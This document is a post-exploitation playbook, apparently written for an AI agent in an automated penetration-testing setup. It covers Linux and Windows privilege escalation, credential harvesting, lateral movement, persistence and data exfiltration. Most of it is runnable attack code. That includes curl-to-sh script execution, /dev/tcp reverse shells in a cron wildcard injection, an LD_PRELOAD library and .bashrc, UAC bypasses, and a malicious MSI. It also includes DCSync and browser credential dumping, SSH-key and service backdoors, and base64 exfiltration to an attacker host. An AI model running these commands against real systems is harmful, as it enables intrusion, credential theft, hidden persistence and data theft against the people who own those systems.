## Cybersecurity Skills (Invoke First)

Before starting post-exploitation, invoke these skills via the Skill tool:
- `cybersecurity-skills:performing-privilege-escalation-on-linux`
- `cybersecurity-skills:performing-lateral-movement-with-wmiexec`
- `cybersecurity-skills:performing-credential-access-with-lazagne`
- `cybersecurity-skills:extracting-credentials-from-memory-dump`

## Scope Enforcement
Verify target is in scope.txt. Confirm active session exists before proceeding.
Document current access level (user, service, www-data, SYSTEM, etc.) before escalation.

---

## Linux Privilege Escalation

### Automated Enumeration
```bash
EVIDENCE=evidence/$(date +%Y%m%d)/$TARGET
mkdir -p $EVIDENCE/post_ex/{privesc,creds,lateral,persistence,data,evidence}

# LinPEAS — comprehensive Linux privesc checker (preferred)
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh \
  2>&1 | tee /tmp/linpeas_$(date +%s).txt
# Copy results back
cp /tmp/linpeas_*.txt $EVIDENCE/post_ex/privesc/linpeas.txt

# LinEnum (alternative)
curl -sL https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh \
  2>&1 | tee $EVIDENCE/post_ex/privesc/linenum.txt

# Linux Smart Enumeration (lse)
curl -sL https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh | sh \
  2>&1 | tee $EVIDENCE/post_ex/privesc/lse.txt
```

### SUID/SGID Binaries
```bash
# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null | tee $EVIDENCE/post_ex/privesc/suid_bins.txt
# Find SGID binaries
find / -perm -g=s -type f 2>/dev/null | tee $EVIDENCE/post_ex/privesc/sgid_bins.txt

# Check against GTFOBins (https://gtfobins.github.io/)
# Known privesc SUID binaries:
# find, vim, nmap (old), python, perl, ruby, less, more, nano, cp, mv
# awk, bash (if not restricted), env, ftp, tar, zip, strace, ltrace, gdb

# Example: SUID bash
bash -p
# Example: SUID find
find . -exec /bin/sh -p \;
# Example: SUID vim
vim -c ':!/bin/sh'
# Example: SUID python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

### Capabilities
```bash
# List all capabilities on system
getcap -r / 2>/dev/null | tee $EVIDENCE/post_ex/privesc/capabilities.txt

# Dangerous capabilities for privesc:
# cap_setuid → can set UID to 0
# cap_dac_override → bypass file permission checks
# cap_dac_read_search → bypass file read permission checks
# cap_setgid → can set GID
# cap_net_raw → raw socket access (sniffing)
# cap_sys_admin → extensive admin capabilities

# Exploit cap_setuid (if set on any binary):
# /usr/bin/python3 cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

### Cron Jobs
```bash
# List all cron jobs
cat /etc/crontab 2>/dev/null | tee $EVIDENCE/post_ex/privesc/crontab.txt
ls -la /etc/cron.* 2>/dev/null | tee -a $EVIDENCE/post_ex/privesc/crontab.txt
crontab -l 2>/dev/null | tee -a $EVIDENCE/post_ex/privesc/crontab.txt

# Check for writable cron scripts/directories
ls -la /etc/cron.d/ 2>/dev/null
ls -la /etc/cron.daily/ 2>/dev/null
ls -la /etc/cron.hourly/ 2>/dev/null

# Check for wildcard in cron commands (PATH hijack)
# If crontab has: * * * * * root tar czf /tmp/backup.tar.gz *
# Create file named "--checkpoint=1" and "--checkpoint-action=exec=sh shell.sh"
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > shell.sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
# Wait for cron to execute

# Check for symlink attacks in cron
# If cron writes to a predictable path, symlink it
```

### NFS Exports (no_root_squash)
```bash
# Check NFS exports on local mount or target
cat /etc/exports 2>/dev/null
# From attacker machine:
showmount -e $TARGET 2>/dev/null

# If no_root_squash on writable share:
# 1. Mount share
mkdir -p /tmp/nfs_mount
mount -o nolock $TARGET:/exported/path /tmp/nfs_mount
# 2. Create SUID shell as root
cp /bin/bash /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell
# 3. On target, execute /exported/path/shell → root shell
```

### Kernel Exploits
```bash
# Identify kernel version
uname -r | tee $EVIDENCE/post_ex/privesc/kernel_version.txt
cat /etc/os-release 2>/dev/null | tee $EVIDENCE/post_ex/privesc/os_release.txt

# Search for kernel exploits
KERNEL=$(uname -r | cut -d'-' -f1)
searchsploit "linux kernel $KERNEL" 2>&1 | tee $EVIDENCE/post_ex/privesc/kernel_exploits.txt
searchsploit "linux kernel $(uname -r)" 2>&1 | tee -a $EVIDENCE/post_ex/privesc/kernel_exploits.txt

# Linux Exploit Suggester (automated matching)
curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | sh \
  2>&1 | tee $EVIDENCE/post_ex/privesc/exploit_suggester.txt

# WARNING: Kernel exploits can crash the system. Confirm with engagement lead before attempting.
```

### Linux Enumeration Quick Reference
```bash
# sudo privileges (check GTFOBins for each entry)
sudo -l 2>/dev/null | tee $EVIDENCE/post_ex/privesc/sudo_l.txt

# Running services as root
ps auxf | grep root | tee $EVIDENCE/post_ex/privesc/root_processes.txt

# Network listeners
ss -tulnp 2>/dev/null | tee $EVIDENCE/post_ex/privesc/listening_ports.txt

# World-writable files in PATH
find $(echo $PATH | tr ':' ' ') -writable 2>/dev/null | tee $EVIDENCE/post_ex/privesc/writable_path.txt

# Password files
cat /etc/passwd | grep -v nologin | grep -v false | tee $EVIDENCE/post_ex/privesc/valid_users.txt

# Bash/shell histories
find /home -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | \
  xargs cat 2>/dev/null | tee $EVIDENCE/post_ex/privesc/shell_history.txt

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_dsa" 2>/dev/null | \
  tee $EVIDENCE/post_ex/privesc/ssh_keys_found.txt

# Docker group membership (docker privesc)
id | grep docker && echo "[!] User in docker group → root via container escape"

# Find config files with credentials
find / -name "*.conf" -o -name "*.config" -o -name "*.env" -o -name ".env" 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|token\|api_key\|aws_secret" 2>/dev/null | \
  head -20 | tee $EVIDENCE/post_ex/privesc/cred_files.txt

# Interesting SUID/SGID binaries — cross-reference GTFOBins
for bin in $(cat $EVIDENCE/post_ex/privesc/suid_bins.txt); do
  name=$(basename $bin)
  echo "[SUID] $bin → check https://gtfobins.github.io/gtfobins/$name/"
done
```

---

## Windows Privilege Escalation

### Automated Enumeration
```powershell
# WinPEAS — comprehensive Windows privesc checker
# Download and run
certutil -urlcache -f http://$LHOST/winPEASx64.exe C:\Windows\Temp\wp.exe 2>nul
C:\Windows\Temp\wp.exe 2>&1 | tee $EVIDENCE/post_ex/privesc/winpeas.txt

# PowerUp (PowerShell)
IEX (New-Object Net.WebClient).DownloadString('http://$LHOST/PowerUp.ps1')
Invoke-AllChecks | tee $EVIDENCE/post_ex/privesc/powerup.txt

# SharpUp (C# — better evasion)
certutil -urlcache -f http://$LHOST/SharpUp.exe C:\Windows\Temp\su.exe 2>nul
C:\Windows\Temp\su.exe audit 2>&1 | tee $EVIDENCE/post_ex/privesc/sharpup.txt
```

### Token Impersonation
```powershell
# Check privileges
whoami /priv | tee $EVIDENCE/post_ex/privesc/privileges.txt

# SeImpersonatePrivilege → Potato family attacks
# SeAssignPrimaryTokenPrivilege → same
if (whoami /priv | findstr "SeImpersonatePrivilege") {
  echo "[!] SeImpersonatePrivilege — use PrintSpoofer, GodPotato, or RoguePotato"
}

# PrintSpoofer (Windows 10/Server 2019+)
# Requires SeImpersonatePrivilege + SeLoadDriverPrivilege
certutil -urlcache -f http://$LHOST/PrintSpoofer.exe C:\Windows\Temp\ps.exe 2>nul
C:\Windows\Temp\ps.exe -i -c "C:\Windows\Temp\shell.exe"
# shell.exe = reverse shell payload

# GodPotato (works on Windows 2012-2022)
certutil -urlcache -f http://$LHOST/GodPotato.exe C:\Windows\Temp\gp.exe 2>nul
C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"

# JuicyPotato (Windows 7/8/10 < 1809, Server 2012/2016)
C:\Windows\Temp\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\shell.exe -t *
```

### UAC Bypass
```powershell
# Check UAC level
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
# ConsentPromptBehaviorAdmin: 0 = Always notify, 1 = Prompt for credentials, 2 = Prompt for consent

# UAC bypass methods (require admin but not SYSTEM):
# 1. Event Viewer registry key hijack
reg add HKCU\Software\Classes\mscfile\shell\open\command /ve /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f
eventvwr.msc  # Triggers command as elevated

# 2. fodhelper.exe registry hijack (same technique)
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# 3. ComputerDefaults.exe
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_EXPAND_SZ /d "C:\Windows\Temp\shell.exe" /f
ComputerDefaults.exe

# 4. Token duplication (BypassUAC via custom tool)
# Requires SeDebugPrivilege in medium integrity process
```

### Unquoted Service Paths
```powershell
# Enumerate unquoted service paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" \
  | tee $EVIDENCE/post_ex/privesc/unquoted_services.txt

# Exploit: if path is "C:\Program Files\My Service\service.exe"
# Create C:\Program.exe or "C:\Program Files\My.exe"
# Service starts as SYSTEM → your binary runs as SYSTEM

# Check if we can write to any of the path segments
for /f "tokens=*" %a in ('wmic service get pathname ^| findstr /i /v "C:\Windows"') do (
  echo [Service] %a
)
```

### DLL Hijacking
```powershell
# Find services with unregistered DLLs
# Process Monitor (Sysinternals) — filter for NAME NOT FOUND on DLL loads

# Common DLL hijack targets:
# - Services that load DLLs from writable directories
# - Applications in ProgramData (users can write)
# - Services with PATH DLL search order vulnerability

# DLL hijack test: create a DLL that logs loading
# Compile a DLL that writes to a log file when DllMain is called
# Place it in the same directory as the vulnerable executable

# SharpDll Hijack (automated DLL hijack discovery)
certutil -urlcache -f http://$LHOST/SharpDllHijack.exe C:\Windows\Temp\dllh.exe 2>nul
C:\Windows\Temp\dllh.exe audit 2>&1 | tee $EVIDENCE/post_ex/privesc/dll_hijack.txt
```

### AlwaysInstallElevated
```powershell
# Check both registry keys (both must be 1)
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both = 1 → ANY user can install MSI as SYSTEM
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o evil.msi
# Transfer to target, execute:
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

### Stored Credentials
```powershell
# Windows Credential Manager
cmdkey /list | tee $EVIDENCE/post_ex/privesc/saved_credentials.txt

# Registry stored credentials
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | \
  tee $EVIDENCE/post_ex/privesc/winlogon_creds.txt
# DefaultDomainName, DefaultUserName, DefaultPassword, AltDefaultDomainName, AltDefaultUserName, AltDefaultPassword

# DPAPI stored credentials (Master Keys)
# Located in: %APPDATA%\Microsoft\Protect\%SID%
# Requires DPAPI decryption (pass the hash or Mimikatz)

# VNC passwords
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
reg query "HKCU\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# PuTTY saved sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul | \
  tee $EVIDENCE/post_ex/privesc/putty_sessions.txt

# Saved RDP connections (registry)
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>nul

# Find credential files on disk
dir /s /b C:\Users\*.xml C:\Users\*.ini C:\Users\*.txt C:\Users\*.config 2>nul | \
  findstr /i "password" | head -20 | tee $EVIDENCE/post_ex/privesc/cred_files.txt
```

---

## Credential Harvesting

### Linux Credentials
```bash
# Shadow file (requires root)
cat /etc/shadow 2>/dev/null | tee $EVIDENCE/post_ex/creds/shadow_hashes.txt
# Hand off to password-attacks agent for hashcat -m 1800

# /etc/passwd for user enumeration
cat /etc/passwd | tee $EVIDENCE/post_ex/creds/passwd.txt

# SSH keys
find / -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_dsa*" 2>/dev/null | \
  while read key; do
    echo "=== $key ==="
    cat "$key" 2>/dev/null
  done | tee $EVIDENCE/post_ex/creds/ssh_keys.txt

# SSH authorized_keys (for lateral movement targets)
find /home -name "authorized_keys" 2>/dev/null | \
  while read f; do echo "=== $f ==="; cat "$f" 2>/dev/null; done | \
  tee $EVIDENCE/post_ex/creds/authorized_keys.txt

# Configuration files with credentials
find /etc /home /var/www /opt /srv -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" -o -name "*.yml" -o -name "*.yaml" -o -name "*.properties" -o -name "wp-config.php" -o -name "database.yml" \) 2>/dev/null | \
  xargs grep -l "password\|passwd\|secret\|token\|api_key\|aws_secret\|DB_PASS\|MYSQL" 2>/dev/null | \
  head -30 | tee $EVIDENCE/post_ex/creds/cred_config_files.txt

# Environment variables
env | grep -iE "pass|token|key|secret|api" 2>/dev/null | tee $EVIDENCE/post_ex/creds/env_vars.txt
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|token|key|secret" | sort -u | \
  tee $EVIDENCE/post_ex/creds/proces_env.txt

# AWS credentials
cat ~/.aws/credentials 2>/dev/null | tee $EVIDENCE/post_ex/creds/aws_creds.txt
cat ~/.aws/config 2>/dev/null | tee -a $EVIDENCE/post_ex/creds/aws_creds.txt
# Check IAM role (EC2 instances):
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null
```

### Windows Credentials
```bash
# SAM + SYSTEM hashes (local accounts — requires SYSTEM/Admin)
impacket-secretsdump -sam SAM -system SYSTEM LOCAL 2>/dev/null | \
  tee $EVIDENCE/post_ex/creds/local_sam_hashes.txt

# Domain credentials via DCSync (requires domain admin)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC_IP -just-dc \
  -outputfile $EVIDENCE/post_ex/creds/dcsync 2>/dev/null

# NTDS.dit extraction (alternative to DCSync)
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL 2>/dev/null | \
  tee $EVIDENCE/post_ex/creds/ntds_hashes.txt

# Mimikatz (via impacket — no file drop needed)
# Full credential dump from memory
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET 2>/dev/null | \
  tee $EVIDENCE/post_ex/creds/full_secretsdump.txt

# Mimikatz commands (if on target):
# Load in meterpreter: load kiwi
# creds_all                          → All credentials
# creds_msv                          → LM/NTLM hashes
# creds_wdigest                      → WDigest clear-text
# creds_kerberos                     → Kerberos tickets
# lsadump::sam                       → Local SAM hashes
# lsadump::dcsync /domain:$DOMAIN /all → DCSync all

# DPAPI extraction
# Master keys location: %APPDATA%\Microsoft\Protect\%SID%\
# Requires user password or domain backup key for decryption
# Use: mimikatz::dpapi::masterkey /in:"path/to/masterkey" /sid:$SID /password:$PASS
# Or: dpapi::masterkey /in:"path" /pvk:"domain_backup_key.pvk"
```

### Browser Credential Dumping
```bash
# Chromium-based browsers (Chrome, Edge, Brave, Opera)
# Cookie database: ~/AppData/Local/Google/Chrome/User Data/Default/Cookies
# Login data: ~/AppData/Local/Google/Chrome/User Data/Default/Login Data
# Decrypt with DPAPI master key

# SharpChromium (no Mimikatz needed)
certutil -urlcache -f http://$LHOST/SharpChromium.exe C:\Windows\Temp\sc.exe 2>nul
C:\Windows\Temp\sc.exe logins
C:\Windows\Temp\sc.exe cookies
C:\Windows\Temp\sc.exe cookies --cookie-format Netscape

# LaZagne (multi-platform credential harvester)
# Linux:
lazagne all 2>&1 | tee $EVIDENCE/post_ex/creds/lazagne_linux.txt
# Windows:
certutil -urlcache -f http://$LHOST/lazagne.exe C:\Windows\Temp\lz.exe 2>nul
C:\Windows\Temp\lz.exe all 2>&1 | tee $EVIDENCE/post_ex/creds/lazagne_windows.txt
```

---

## Lateral Movement

### SMB-Based Movement
```bash
# Pass-the-Hash (PtH) — no plaintext password needed
impacket-psexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET 2>&1 | tee $EVIDENCE/post_ex/lateral/pth_$TARGET.txt
impacket-wmiexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET 2>&1 | tee -a $EVIDENCE/post_ex/lateral/pth_$TARGET.txt
impacket-smbexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET 2>&1 | tee -a $EVIDENCE/post_ex/lateral/pth_$TARGET.txt
impacket-atexec -hashes :$NTLM_HASH $DOMAIN/$USER@$TARGET "whoami" 2>&1 | tee -a $EVIDENCE/post_ex/lateral/pth_$TARGET.txt

# Pass-the-Ticket (PtT) — Kerberos ticket reuse
export KRB5CCNAME=$EVIDENCE/post_ex/creds/ticket.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -no-pass -k 2>&1 | tee $EVIDENCE/post_ex/lateral/ptt_$TARGET.txt

# Overpass-the-Hash (Pass the Key)
# Convert NTLM hash to Kerberos TGT using RC4
impacket-getTGT $DOMAIN/$USER -hashes :$NTLM_HASH
export KRB5CCNAME=$USER.ccache
impacket-psexec $DOMAIN/$USER@$TARGET -no-pass -k

# SMB credential spray (test creds across subnet)
netexec smb $SUBNET/24 -u $USER -p $PASS --shares --continue-on-success \
  2>&1 | tee $EVIDENCE/post_ex/lateral/smb_spray.txt

# SMB session enumeration
netexec smb $SUBNET/24 --sessions 2>&1 | tee $EVIDENCE/post_ex/lateral/smb_sessions.txt
```

### WMI / WinRM / PSExec
```bash
# WMI remote execution
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET "whoami" 2>&1 | tee $EVIDENCE/post_ex/lateral/wmi_$TARGET.txt
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET "hostname && whoami /groups" 2>&1

# PowerShell remoting (WinRM)
evil-winrm -i $TARGET -u $USER -p $PASS 2>&1
# Inside evil-winrm:
# upload local_file  → upload to target
# download remote_file → download to attacker
# menu → DCSync, SAM dump, etc.

# PSExec via impacket
impacket-psexec $DOMAIN/$USER:$PASS@$TARGET 2>&1

# RDP with credentials
xfreerdp /v:$TARGET /u:$USER /p:$PASS /dynamic-resolution +clipboard /cert:tofu

# SSH lateral (Linux targets)
ssh -o StrictHostKeyChecking=no $USER@$TARGET "whoami && id" 2>&1 | tee $EVIDENCE/post_ex/lateral/ssh_$TARGET.txt
```

### PsExec via NetExec
```bash
# Execute command on remote Windows host via SMB
netexec smb $TARGET -u $USER -p $PASS -x "whoami" 2>&1

# Get a shell via NetExec
netexec smb $TARGET -u $USER -p $PASS --exec-method smbexec 2>&1

# Upload file via SMB
netexec smb $TARGET -u $USER -p $PASS --put /local/file.txt C:\\Windows\\Temp\\file.txt 2>&1
```

---

## Persistence Mechanisms

### Linux Persistence
```bash
# Cron job (per-user)
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.hidden_c2.sh") | crontab -
# Or system-wide:
echo "*/5 * * * * root /tmp/.hidden_c2.sh" >> /etc/crontab

# Systemd service (requires root)
cat > /etc/systemd/system/updates.service << EOF
[Unit]
Description=System Updates
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.hidden_c2.sh
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable updates.service

# SSH authorized_keys (backdoor access)
mkdir -p ~/.ssh && echo "$ATTACKER_SSH_KEY" >> ~/.ssh/authorized_keys
# For root:
mkdir -p /root/.ssh && echo "$ATTACKER_SSH_KEY" >> /root/.ssh/authorized_keys

# LD_PRELOAD (root — library injection)
cat > /tmp/evil.c << 'CEOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void pwn(void) {
    // Reverse shell or beacon
    if (fork() == 0) {
        execl("/bin/bash", "bash", "-c", "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1", NULL);
    }
}
CEOF
gcc -shared -fPIC /tmp/evil.c -o /tmp/evil.so -ldl
echo "/tmp/evil.so" > /etc/ld.so.preload

# Bash profile persistence
echo 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &' >> ~/.bashrc
```

### Windows Persistence
```powershell
# Registry Run keys (survives reboot, user-level)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /t REG_SZ /d "C:\Windows\Temp\updater.exe" /f

# Registry Run keys (system-level, requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemService" /t REG_SZ /d "C:\Windows\Temp\svchost.exe" /f

# Scheduled Task (survives reboot, runs as SYSTEM)
schtasks /create /tn "SystemUpdate" /tr "C:\Windows\Temp\updater.exe" /sc onstart /ru SYSTEM /f

# Windows Service (survives reboot, runs as SYSTEM)
sc create "UpdateService" binPath= "C:\Windows\Temp\updater.exe" start= auto
sc start UpdateService

# WMI Event Subscription (fileless, highly persistent)
# Requires admin → SYSTEM access
# Uses: __EventFilter (trigger) + __EventConsumer (action) + __FilterToConsumerBinding
# Tools: SharpWMI, PowerSploit's New-WmiPersistence

# DLL search order hijacking (replaces legitimate DLL)
# Place malicious DLL in application directory where service runs from

# COM hijacking (survives reboot, loaded by legitimate processes)
# See evasion.md for COM hijack methodology
```

---

## Data Exfiltration Staging

### Staging Methodology
```bash
# Step 1: Identify valuable data
# Step 2: Compress and encrypt
# Step 3: Stage in hidden location
# Step 4: Transfer to collection point

# Compress target directory
tar czf /tmp/stage_$TARGET_$(date +%s).tar.gz -C /path/to/data . 2>/dev/null

# Compress with password
7z a -p$PASS /tmp/stage_$TARGET.7z /path/to/data/* 2>/dev/null
# Or: gpg -c --batch --passphrase "$PASS" /tmp/stage_$TARGET.tar.gz

# Chunk large files for transfer over unreliable connections
split -b 50M /tmp/stage_$TARGET.7z /tmp/stage_chunk_
ls -la /tmp/stage_chunk_*
```

### Transfer Methods
```bash
# HTTP upload
curl -F "file=@/tmp/stage_$TARGET.7z" http://$LHOST/upload/ 2>/dev/null

# SMB transfer
smbclient //$LHOST/share -c "put /tmp/stage_$TARGET.7z stage_$TARGET.7z" 2>/dev/null

# SCP transfer
scp -o StrictHostKeyChecking=no /tmp/stage_$TARGET.7z user@$LHOST:/collection/ 2>/dev/null

# DNS exfiltration (last resort, slow)
# dnscat2 tunnel: established earlier, use for C2 + data transfer

# ICMP exfiltration (if allowed through firewall)
# Use tools like: icmpsh, pingtunnel

# Base64 over HTTP GET (avoids POST detection)
cat /tmp/stage_$TARGET.7z | base64 | split -b 1000 -d - /tmp/chunks_
for chunk in /tmp/chunks_*; do
  curl -s "http://$LHOST/exfil?d=$(cat $chunk)" -o /dev/null
done
```

---

## Evidence Collection Methodology

### What to Collect
```bash
# Linux
├── /etc/passwd, /etc/shadow
├── /etc/ssh/sshd_config
├── ~/.ssh/authorized_keys, ~/.ssh/id_rsa*
├── /var/log/auth.log, /var/log/secure
├── Cron jobs: /etc/crontab, /etc/cron.*, crontab -l
├── Running processes: ps auxf
├── Network config: ifconfig, ip a, ss -tulnp
├── Installed packages: dpkg -l, rpm -qa
└── Environment: env, /proc/*/environ

# Windows
├── SAM + SYSTEM hives (reg save)
├── NTDS.dit (domain controllers)
├── HKLM\SAM, HKLM\SYSTEM, HKLM\SECURITY
├── C:\Users\*\NTUSER.DAT
├── Event logs (Security, System, Application)
├── C:\Windows\System32\config\*.evt
├── Certificate stores
├── WMI repositories
└── IIS logs: C:\inetpub\logs\LogFiles\
```

### Evidence Collection Commands
```bash
# Linux — collect all evidence
mkdir -p /tmp/evidence_$TARGET
cp /etc/passwd /etc/shadow /tmp/evidence_$TARGET/ 2>/dev/null
cp -r /etc/ssh/ /tmp/evidence_$TARGET/ssh_config/ 2>/dev/null
cp /etc/crontab /tmp/evidence_$TARGET/crontab 2>/dev/null
ps auxf > /tmp/evidence_$TARGET/processes.txt 2>/dev/null
ss -tulnp > /tmp/evidence_$TARGET/network.txt 2>/dev/null
find /home -name ".bash_history" -exec cp {} /tmp/evidence_$TARGET/ \; 2>/dev/null

# Windows — collect evidence via impacket
impacket-secretsdump -sam SAM -system SYSTEM LOCAL > /tmp/evidence_$TARGET/sam_dump.txt 2>/dev/null
impacket-secretsdump $DOMAIN/$USER:$PASS@$TARGET > /tmp/evidence_$TARGET/full_dump.txt 2>/dev/null

# Package evidence
tar czf evidence_$TARGET_$(date +%Y%m%d_%H%M%S).tar.gz /tmp/evidence_$TARGET/ 2>/dev/null
# Transfer to collection server
scp evidence_$TARGET_*.tar.gz user@$LHOST:/evidence_collection/ 2>/dev/null
```

### Chain of Custody
```bash
# Hash all collected evidence immediately
sha256sum /tmp/evidence_$TARGET/* > /tmp/evidence_$TARGET/checksums.sha256

# Record collection metadata
cat > /tmp/evidence_$TARGET/metadata.txt << EOF
Collection Time: $(date -u +%Y-%m-%dT%H:%M:%SZ)
Collector: automated (post-ex agent)
Target: $TARGET
Access Level: $(whoami 2>/dev/null || echo N/A)
Method: [ssh/smb/wmi/rdp/meterpreter]
Session: [session ID]
Files collected: $(ls /tmp/evidence_$TARGET/ | wc -l)
SHA256 checksums: attached in checksums.sha256
EOF
```

---

## Handoff to Report Writer

### Evidence Format for Report Agent
```bash
cat > $EVIDENCE/post_ex/handoff_report.md << 'EOF'
## Post-Exploitation Summary — $TARGET — $(date -u +%Y-%m-%dT%H:%M:%SZ)

### Access Level Progression
| Step | Method | From | To | ATT&CK TTP | Evidence File |
|------|--------|------|----|-------------|---------------|
| 1 | Initial access | None | www-data | T[XXXX] | exploit/exploitation.md |
| 2 | Linux privesc | www-data | root | T[XXXX] | privesc/linpeas.txt |
| 3 | Credential harvest | root | domain creds | T[XXXX] | creds/dcsync.txt |

### Credentials Obtained (NO PLAINTEXT in report — use "CRACKED"/"HASH ONLY")
| Type | Account | Hash Type | Source | Cracked? |
|------|---------|-----------|--------|----------|
| NTLM | DOMAIN\admin | NTLMv2 | DCSync | Yes/No |
| SSH Key | root | RSA 4096 | /root/.ssh/id_rsa | N/A |

### Lateral Movement Map
| Source | Destination | Method | Access Level | Result |
|--------|-------------|--------|--------------|--------|

### Persistence Mechanisms Demonstrated
| # | Mechanism | Location | OS | ATT&CK TTP |
|---|-----------|----------|-----|-------------|

### Data Exfiltration Summary
| Data Type | Size | Source | Staging Method | ATT&CK TTP |
|-----------|------|--------|----------------|-------------|

### Key Screenshots (reference by filename)
- [evidence screenshots list]

### Recommendations for Report
1. [Remediation recommendation 1]
2. [Remediation recommendation 2]
3. [Remediation recommendation 3]

### Evidence File Manifest
| File | Description | SHA256 |
|------|-------------|--------|
| privesc/linpeas.txt | LinPEAS automated output | [hash] |
| creds/dcsync.txt | DCSync credential dump | [hash] |
| lateral/smb_spray.txt | SMB credential spray results | [hash] |
EOF
```

## Evidence Output Structure
```
evidence/$(date +%Y%m%d)/$TARGET/
├── post_ex/
│   ├── privesc/
│   │   ├── linpeas.txt
│   │   ├── suid_bins.txt
│   │   ├── capabilities.txt
│   │   ├── crontab.txt
│   │   ├── sudo_l.txt
│   │   ├── kernel_version.txt
│   │   └── winpeas.txt
│   ├── creds/
│   │   ├── shadow_hashes.txt
│   │   ├── ssh_keys.txt
│   │   ├── dcsync.txt
│   │   ├── sam_dump.txt
│   │   ├── lazagne_windows.txt
│   │   ├── aws_creds.txt
│   │   └── browser_creds.txt
│   ├── lateral/
│   │   ├── smb_spray.txt
│   │   ├── pth_TARGET.txt
│   │   ├── smb_sessions.txt
│   │   └── rdp_access.txt
│   ├── persistence/
│   │   ├── installed_mechanisms.txt
│   │   └── cleanup_checklist.txt
│   ├── data/
│   │   ├── stage_TARGET_*.tar.gz
│   │   └── checksums.sha256
│   ├── evidence_TARGET/
│   │   ├── metadata.txt
│   │   ├── checksums.sha256
│   │   └── [collected files]
│   ├── handoff_report.md
│   └── post_ex_summary.md
```
